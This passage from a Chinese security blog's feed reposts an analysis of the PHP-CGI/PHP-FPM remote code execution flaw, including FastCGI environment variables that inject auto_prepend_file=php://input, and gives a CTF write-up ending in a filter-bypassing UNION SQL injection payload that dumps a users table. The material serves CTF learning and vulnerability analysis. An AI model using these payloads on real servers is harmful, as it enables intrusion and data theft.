record结构最大支持的body大小是<code>2^16</code>，也就是65536字节。</p><p>下面用一张图来解析一下type这个属性</p><p><img src="https://i.loli.net/2020/09/13/CyqHuxPzhwRSQKT.jpg"></p><p>服务器中间件和后端语言通信，第一个数据包就是<code>type</code>为1的record，后续互相交流，发送<code>type</code>为4、5、6、7的record，结束时发送<code>type</code>为2、3的record。</p><p>当后端语言接收到一个<code>type</code>为4的record后，就会把这个record的body按照对应的结构解析成key-value对，这就是环境变量。环境变量的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair11;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB0;  &#x2F;* nameLengthB0  &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair14;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB0; &#x2F;* valueLengthB0 &gt;&gt; 7 &#x3D;&#x3D; 0 *&#x2F;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength];</span><br><span class="line">&#125; FCGI_NameValuePair41;</span><br><span class="line"></span><br><span class="line">typedef struct &#123;</span><br><span class="line">  unsigned char nameLengthB3;  &#x2F;* nameLengthB3  &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char nameLengthB2;</span><br><span class="line">  unsigned char nameLengthB1;</span><br><span class="line">  unsigned char nameLengthB0;</span><br><span class="line">  unsigned char valueLengthB3; &#x2F;* valueLengthB3 &gt;&gt; 7 &#x3D;&#x3D; 1 *&#x2F;</span><br><span class="line">  unsigned char valueLengthB2;</span><br><span class="line">  unsigned char valueLengthB1;</span><br><span class="line">  unsigned char valueLengthB0;</span><br><span class="line">  unsigned char nameData[nameLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">  unsigned char valueData[valueLength</span><br><span class="line">          ((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];</span><br><span class="line">&#125; FCGI_NameValuePair44;</span><br></pre></td></tr></table></figure><p>这其实是4个结构，至于用哪个结构，有如下规则：</p><ol><li>key、value均小于128字节，用<code>FCGI_NameValuePair11</code></li><li>key大于128字节，value小于128字节，用<code>FCGI_NameValuePair41</code></li><li>key小于128字节，value大于128字节，用<code>FCGI_NameValuePair14</code></li><li>key、value均大于128字节，用<code>FCGI_NameValuePair44</code></li></ol><p>为什么我只介绍<code>type</code>为4的record？因为环境变量在后面PHP-FPM里有重要作用，之后写代码也会写到这个结构。<code>type</code>的其他情况，请自行百度。</p><h2 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h2><p>上面说到这个协议会将用户上传到数据解析成key-value的键值对的情况，但是打包好后传给谁呢？那个人就是PHP-FPM。</p><p>举个例子，用户访问<code>http://192.168.0.0.1/index.php?ace=1&amp;cve=2</code>，如果web目录是<code>/var/www/html</code>，那么Nginx会将这个请求变成如下key-value对：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?ace&#x3D;1&amp;cve&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个数组其实就是PHP中<code>$_SERVER</code>数组的一部分，也就是PHP里的环境变量。但环境变量的作用不仅是填充<code>$_SERVER</code>数组，也是告诉fpm：“我要执行哪个PHP文件”。然后FPM拿到这些环境变量之后就是进行执行，去找那个PHP文件。</p><h2 id="漏洞解析"><a href="#漏洞解析" class="headerlink" title="漏洞解析"></a>漏洞解析</h2><p>这个漏洞简单的来说就是用户提供的**未加=**的数据被当作PHP-CGI的参数，最后导致了一系列的结果。这个是RFC3875中规定的，Apache服务器按要求实现了这个功能，但PHP并没有注意到RFC的这一个规则，也许是曾经注意并处理了，处理方法就是web上下文中不允许传入参数。</p><p>但是开发者是为了方便使用类似<code>#!/usr/local/bin/php-cgi -d include_path=/path</code>的写法来进行测试，认为不应该限制php-cgi接受命令行参数，而且这个功能不和其他代码有任何冲突。于是就把限制给删掉了，但是很显然，根据RFC中对于命令行的说明，参数不光能够通过上诉方法传入，还可以通过请求参数。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li><code>-c</code> 指定php.ini文件的位置</li><li><code>-n</code> 不要加载php.ini文件</li><li><code>-d</code> 指定配置项</li><li><code>-b</code> 启动fastcgi进程</li><li><code>-s</code> 显示文件源码</li><li><code>-T</code> 执行指定次该文件</li><li><code>-h</code>和<code>-?</code> 显示帮助</li></ul><p>这次放在源代码之后就可以进行利用，简单方便。当然继续看下去， 看见**-d**这个牛鼻的参数这个漏洞又怎么会这么简单呢？？</p><p>实际使用中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allow_url_include:远程文件包含</span><br><span class="line">&#96;auto_prepend_file&#96;：包含我们的代码</span><br></pre></td></tr></table></figure><p>我们继续解析:</p><h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h2><p>这里怎么去任意代码执行，首先有以下几个问题:</p><ul><li><p>即使我们能控制<code>SCRIPT_FILENAME</code>，让fpm执行任意文件，也只是执行目标服务器上的文件，并不能执行我们需要其执行的文件。</p></li><li><p>我们怎么把代码上传上去</p><p>PHP语言的特性就是有很多很强大的配置项<code>auto_prepend_file</code>和<code>auto_append_file</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.auto_prepend_file是告诉PHP，在执行目标文件之前，先包含auto_prepend_file中指定的文件；</span><br><span class="line">2.auto_append_file是告诉PHP，在执行完成目标文件后，包含auto_append_file指向的文件。</span><br></pre></td></tr></table></figure><p>如果我们把auto_prepend__file设置成<code>php://input</code>然后我们再执行任何的php文件前都会包含一些post的内容了，所以我们只要post一下，这些代码就都能够被执行了，（当然，还需要开启远程文件包含选项<code>allow_url_include</code>）</p></li></ul><p>这个时候就有下一个问题了，就是我们怎么设置这个环境变量的值呢？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP_VALUE&#96;和&#96;PHP_ADMIN_VALUE</span><br><span class="line">这两个环境变量就是用来设置PHP配置项的，PHP_VALUE可以设置模式为PHP_INI_USER和PHP_INI_ALL的选项，PHP_ADMIN_VALUE可以设置所有选项。（disable_functions除外，这个选项是PHP加载的时候就确定了，在范围内的函数直接不会被加载到PHP上下文中</span><br></pre></td></tr></table></figure><p>这就是他们两个的特长了。</p><p>所以，我们最后传入如下环境变量：（直接和FPM进行通信）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#39;GATEWAY_INTERFACE&#39;: &#39;FastCGI&#x2F;1.0&#39;,</span><br><span class="line">    &#39;REQUEST_METHOD&#39;: &#39;GET&#39;,</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;index.php&#39;,</span><br><span class="line">    &#39;QUERY_STRING&#39;: &#39;?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;index.php?a&#x3D;1&amp;b&#x3D;2&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    &#39;SERVER_SOFTWARE&#39;: &#39;php&#x2F;fcgiclient&#39;,</span><br><span class="line">    &#39;REMOTE_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;REMOTE_PORT&#39;: &#39;12345&#39;,</span><br><span class="line">    &#39;SERVER_ADDR&#39;: &#39;127.0.0.1&#39;,</span><br><span class="line">    &#39;SERVER_PORT&#39;: &#39;80&#39;,</span><br><span class="line">    &#39;SERVER_NAME&#39;: &quot;localhost&quot;,</span><br><span class="line">    &#39;SERVER_PROTOCOL&#39;: &#39;HTTP&#x2F;1.1&#39;</span><br><span class="line">    &#39;PHP_VALUE&#39;: &#39;auto_prepend_file &#x3D; php:&#x2F;&#x2F;input&#39;,</span><br><span class="line">    &#39;PHP_ADMIN_VALUE&#39;: &#39;allow_url_include &#x3D; On&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Nginx（IIS7）解析漏洞（文件上传"><a href="#Nginx（IIS7）解析漏洞（文件上传" class="headerlink" title="Nginx（IIS7）解析漏洞（文件上传)"></a>Nginx（IIS7）解析漏洞（文件上传)</h2><p>Nginx和IIS7曾经出现过一个PHP相关的解析漏洞（测试环境<code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code>），该漏洞现象是，在用户访问<code>http://127.0.0.1/favicon.ico/.php</code>时，访问到的文件是favicon.ico，但却按照.php后缀解析了。</p><p>用户请求<code>http://127.0.0.1/favicon.ico/.php</code>，nginx将会发送如下环境变量到fpm里：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    &#39;SCRIPT_FILENAME&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;SCRIPT_NAME&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;REQUEST_URI&#39;: &#39;&#x2F;favicon.ico&#x2F;.php&#39;,</span><br><span class="line">    &#39;DOCUMENT_ROOT&#39;: &#39;&#x2F;var&#x2F;www&#x2F;html&#39;,</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正常来说，<code>SCRIPT_FILENAME</code>的值是一个不存在的文件<code>/var/www/html/favicon.ico/.php</code>，是PHP设置中的一个选项<code>fix_pathinfo</code>导致了这个漏洞。PHP为了支持Path Info模式而创造了<code>fix_pathinfo</code>，在这个选项被打开的情况下，fpm会判断<code>SCRIPT_FILENAME</code>是否存在，如果不存在则去掉最后一个<code>/</code>及以后的所有内容，再次判断文件是否存在，往次循环，直到文件存在。</p><p>所以，第一次fpm发现<code>/var/www/html/favicon.ico/.php</code>不存在，则去掉<code>/.php</code>，再判断<code>/var/www/html/favicon.ico</code>是否存在。显然这个文件是存在的，于是被作为PHP文件执行，导致解析漏洞。</p><p>正确的解决方法有两种，一是在Nginx端使用<code>fastcgi_split_path_info</code>将path info信息去除后，用tryfiles判断文件是否存在；二是借助PHP-FPM的<code>security.limit_extensions</code>配置项，避免其他后缀文件被解析</p><h2 id="security-limit-extensions配置"><a href="#security-limit-extensions配置" class="headerlink" title="security.limit_extensions配置"></a><code>security.limit_extensions</code>配置</h2><p>写到这里，PHP-FPM未授权访问漏洞也就呼之欲出了。PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信。</p><p>此时，<code>SCRIPT_FILENAME</code>的值就格外重要了。因为fpm是根据这个值来执行php文件的，如果这个文件不存在，fpm会直接返回404：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/04/25/703367c4-af98-4702-85f0-794b30776a4f.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/04/25/703367c4-af98-4702-85f0-794b30776a4f.073e567856db.jpg" alt="14931285844835.jpg"></a></p><p>在fpm某个版本之前，我们可以将<code>SCRIPT_FILENAME</code>的值指定为任意后缀文件，比如<code>/etc/passwd</code>；但后来，fpm的默认配置中增加了一个选项<code>security.limit_extensions</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">; Limits the extensions of the main script FPM will allow to parse. This can</span><br><span class="line">; prevent configuration mistakes on the web server side. You should only limit</span><br><span class="line">; FPM to .php extensions to prevent malicious users to use other extensions to</span><br><span class="line">; exectute php code.</span><br><span class="line">; Note: set an empty value to allow all extensions.</span><br><span class="line">; Default Value: .php</span><br><span class="line">;security.limit_extensions &#x3D; .php .php3 .php4 .php5 .php7</span><br></pre></td></tr></table></figure><p>其限定了只有某些后缀的文件允许被fpm执行，默认是<code>.php</code>。所以，当我们再传入<code>/etc/passwd</code>的时候，将会返回<code>Access denied.</code>：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/04/25/99d10f40-7dc3-46f3-a0bb-dae71e9d550b.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/04/25/99d10f40-7dc3-46f3-a0bb-dae71e9d550b.30fa707133a3.jpg" alt="14931290357686.jpg"></a></p><blockquote><p>ps. 这个配置也会影响Nginx解析漏洞，我觉得应该是因为Nginx当时那个解析漏洞，促成PHP-FPM增加了这个安全选项。另外，也有少部分发行版安装中<code>security.limit_extensions</code>默认为空，此时就没有任何限制了。</p></blockquote><p>由于这个配置项的限制，如果想利用PHP-FPM的未授权访问漏洞，首先就得找到一个已存在的PHP文件。</p><p>万幸的是，通常使用源安装php的时候，服务器上都会附带一些php后缀的文件，我们使用<code>find / -name &quot;*.php&quot;</code>来全局搜索一下默认环境：</p><p><a href="https://www.leavesongs.com/media/attachment/2017/04/25/15695b8e-79ae-4f32-b061-cc5f52236e18.jpg"><img src="https://www.leavesongs.com/media/attachment/2017/04/25/15695b8e-79ae-4f32-b061-cc5f52236e18.a5365d20818a.jpg" alt="14931297810961.jpg"></a></p><p>找到了不少。这就给我们提供了一条思路，假设我们爆破不出来目标环境的web目录，我们可以找找默认源安装后可能存在的php文件，比如<code>/usr/local/lib/php/PEAR.php</code>。</p><p>exp:：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a> </p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;lt-转载-gt-PHP-CGI远程代码执行漏洞&quot;&gt;&lt;a href=&quot;#lt-转载-gt-PHP-CGI远程代码执行漏洞&quot; class=&quot;headerlink&quot; title=&quot;&amp;lt;转载&amp;gt;PHP-CGI远程代码执行漏洞&quot;&gt;&lt;/a&gt;&amp;lt;转载&amp;gt;PHP-CGI远程代码执行漏洞&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;影响的:php &amp;lt; 5.3.12 or php &amp;lt; 5.4.2&lt;/p&gt;
&lt;p&gt;转载链接：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://baijiahao.baidu.com/s?id=1637483210158521104&amp;amp;wfr=spider&amp;amp;for=pc1&quot;&gt;https://baijiahao.baidu.com/s?id=1637483210158521104&amp;amp;wfr=spider&amp;amp;for=pc1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html&quot;&gt;Fastcgi协议分析 &amp;amp;&amp;amp; PHP-FPM未授权访问漏洞 &amp;amp;&amp;amp; Exp编写&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;漏洞解读&quot;&gt;&lt;a href=&quot;#漏洞解读&quot; class=&quot;headerlink&quot; title=&quot;漏洞解读&quot;&gt;&lt;/a&gt;漏洞解读&lt;/h2&gt;&lt;h3 id=&quot;CGi-协议&quot;&gt;&lt;a href=&quot;#CGi-协议&quot; class=&quot;headerlink&quot; title=&quot;CGi 协议&quot;&gt;&lt;/a&gt;CGi 协议&lt;/h3&gt;&lt;p&gt;CGI是一种网页表单和程序之间通信的一种协议，和HTTP协议一样，用于进行数据交换。可以用任何语言来写一个CGI脚本，这些语言只要能接受输入输出信息，读取环境变量。&lt;/p&gt;
&lt;p&gt;php-cgi也是一个sapi。在远古的时候，web应用的运行方式很简单，web容器接收到http数据包后，拿到用户请求的文件（cgi脚本），并fork出一个子进程（解释器）去执行这个文件，然后拿到执行结果，直接返回给用户，同时这个解释器子进程也就结束了。基于bash、perl等语言的web应用多半都是以这种方式来执行，这种执行方式一般就被称为cgi&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="CVE" scheme="http://example.com/categories/CTF/CVE/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="CVE" scheme="http://example.com/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>SWPU2019-Web1</title>
    <link href="http://example.com/2020/09/13/SWPU2019-Web1/"/>
    <id>http://example.com/2020/09/13/SWPU2019-Web1/</id>
    <published>2020-09-13T02:22:57.000Z</published>
    <updated>2020-09-13T03:24:43.937Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Buu刷题记"><a href="#Buu刷题记" class="headerlink" title="Buu刷题记"></a>Buu刷题记</h1><h2 id="一、题目打开介绍"><a href="#一、题目打开介绍" class="headerlink" title="一、题目打开介绍"></a>一、题目打开介绍</h2><p><img src="https://i.loli.net/2020/09/13/7cQB8umN1sZLyOp.png" alt="image-20200913095530231.png">这是题目本身打开的样子，继续进入题目</p><h2 id="二、做题"><a href="#二、做题" class="headerlink" title="二、做题"></a>二、做题</h2><p><img src="https://i.loli.net/2020/09/13/YHLftTQmUd1besK.png" alt="image-20200913095634097.png"></p><p>简单的登陆界面和注册界面，没有sql注入<strong>已经尝试</strong></p><a id="more"></a><p><img src="https://i.loli.net/2020/09/13/cfFtN41xLoAQEjO.png" alt="image-20200913095733239.png"></p><p>申请发布广告</p><p><img src="https://i.loli.net/2020/09/13/sOEZrzKgn2LqU5t.png" alt="image-20200913095759770.png"></p><p>习惯性的测试</p><p><img src="https://i.loli.net/2020/09/13/vDZlT7YSPexgVrJ.png" alt="image-20200913095857022.png"></p><p>然后开始尝试注入，抓包，</p><p><img src="https://i.loli.net/2020/09/13/RjvFaOTiMcZuBgG.png" alt="image-20200913095931186.png"><br><img src="https://i.loli.net/2020/09/13/eZLKpvNyosAEJnP.png" alt="image-20200913095944857.png"></p><p>两个都要，经过union注入判断列数，发现是22列</p><p>然后收集信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">database() web1</span><br><span class="line">version() 10.2.26-MariaDB-log</span><br></pre></td></tr></table></figure><p>然后开始使用<strong>information</strong>库进行爆表，爆字段<br><img src="https://i.loli.net/2020/09/13/6fwnvVYWotsuXDS.png" alt="image-20200913100124933.png"></p><p>然后没有用，再加上一下字符被毁掉</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and or updatexml 空格</span><br></pre></td></tr></table></figure><p>用/**/代替空格，然后继续解决无法爆出表的问题</p><p>经过百度发现还有一个表可以爆出表名</p><p><a href="https://mariadb.com/kb/en/mysqlinnodb_index_stats/">https://mariadb.com/kb/en/mysqlinnodb_index_stats/</a></p><p>就是上面这个库，然后开始继续操作就行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tables() FLAG_TABLE,news,users,gtid_slave_pos,ads,users</span><br></pre></td></tr></table></figure><p>这就是已经取得的数据。</p><p>下面解决无法爆字段的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users</span><br></pre></td></tr></table></figure><p>如果直接使用这个命令的·话，他会返回多条数据然后并且报错，并且我们现在无法知道字段名，必须再想其他的办法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 union select * from users</span><br></pre></td></tr></table></figure><p>这样就可以造出临时表，字段名分别可以知道了<strong>需要猜一下字段数</strong></p><p>最后 payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">title&#x3D;-1&#39;and&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select&#x2F;**&#x2F;group_concat(b)from(select&#x2F;**&#x2F;1,2,3&#x2F;**&#x2F;as&#x2F;**&#x2F;b&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*&#x2F;**&#x2F;from&#x2F;**&#x2F;users)x),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#39;&amp;content&#x3D;a&amp;ac&#x3D;add</span><br></pre></td></tr></table></figure><p>这里有两个注意的点</p><h3 id="1-临时表再次使用时必须要有一个别名"><a href="#1-临时表再次使用时必须要有一个别名" class="headerlink" title="1.临时表再次使用时必须要有一个别名"></a>1.临时表再次使用时必须要有一个别名</h3><h3 id="2-记得带括号"><a href="#2-记得带括号" class="headerlink" title="2.记得带括号"></a>2.记得带括号</h3><h3 id="3-数字不能做字段名"><a href="#3-数字不能做字段名" class="headerlink" title="3.数字不能做字段名"></a>3.数字不能做字段名</h3>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Buu刷题记&quot;&gt;&lt;a href=&quot;#Buu刷题记&quot; class=&quot;headerlink&quot; title=&quot;Buu刷题记&quot;&gt;&lt;/a&gt;Buu刷题记&lt;/h1&gt;&lt;h2 id=&quot;一、题目打开介绍&quot;&gt;&lt;a href=&quot;#一、题目打开介绍&quot; class=&quot;headerlink&quot; title=&quot;一、题目打开介绍&quot;&gt;&lt;/a&gt;一、题目打开介绍&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/09/13/7cQB8umN1sZLyOp.png&quot; alt=&quot;image-20200913095530231.png&quot;&gt;这是题目本身打开的样子，继续进入题目&lt;/p&gt;
&lt;h2 id=&quot;二、做题&quot;&gt;&lt;a href=&quot;#二、做题&quot; class=&quot;headerlink&quot; title=&quot;二、做题&quot;&gt;&lt;/a&gt;二、做题&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2020/09/13/YHLftTQmUd1besK.png&quot; alt=&quot;image-20200913095634097.png&quot;&gt;&lt;/p&gt;
&lt;p&gt;简单的登陆界面和注册界面，没有sql注入&lt;strong&gt;已经尝试&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="BUU" scheme="http://example.com/categories/CTF/BUU/"/>
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
    <category term="BUU" scheme="http://example.com/tags/BUU/"/>
    
  </entry>
  
  <entry>
    <title>This Is A New Beginning</title>
    <link href="http://example.com/2020/09/13/new-begin/"/>
    <id>http://example.com/2020/09/13/new-begin/</id>
    <published>2020-09-13T02:22:57.000Z</published>
    <updated>2020-09-13T02:59:39.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="This-Is-A-New-Beginning"><a href="#This-Is-A-New-Beginning" class="headerlink" title="This Is A New Beginning"></a>This Is A New Beginning</h1><h2 id="一、开场白"><a href="#一、开场白" class="headerlink" title="一、开场白"></a>一、开场白</h2><p>​        花了一个上午搭建而起的博客，gitpage+hexo 两个软件合成在一起，进行自己的学习的记录，记录python人工智能和CTF方向的学习知识，每天记录一点点，每天多学一点点，同时将自己的知识分享给大家，可以让大家一起少走一些弯路，如果有错的，不同的想法，请大家在评论区给出。后面将开通账号的注册功能，搭建一个论坛的系统。 <strong>for study</strong></p><h1 id="二、分享曾经经验"><a href="#二、分享曾经经验" class="headerlink" title="二、分享曾经经验"></a>二、分享曾经经验</h1><p><a href="https://www.yuque.com/crawler-splj2/ggs6sg">CTF-WEB</a></p><p><a href="https://www.yuque.com/crawler-splj2/ggs6sg">BUUCTF</a></p><p><a href="https://www.yuque.com/crawler-splj2/rgxure">MISC</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;This-Is-A-New-Beginning&quot;&gt;&lt;a href=&quot;#This-Is-A-New-Beginning&quot; class=&quot;headerlink&quot; title=&quot;This Is A New Beginning&quot;&gt;&lt;/a&gt;This Is A New Beg</summary>
      
    
    
    
    <category term="随笔" scheme="http://example.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随笔" scheme="http://example.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
</feed>
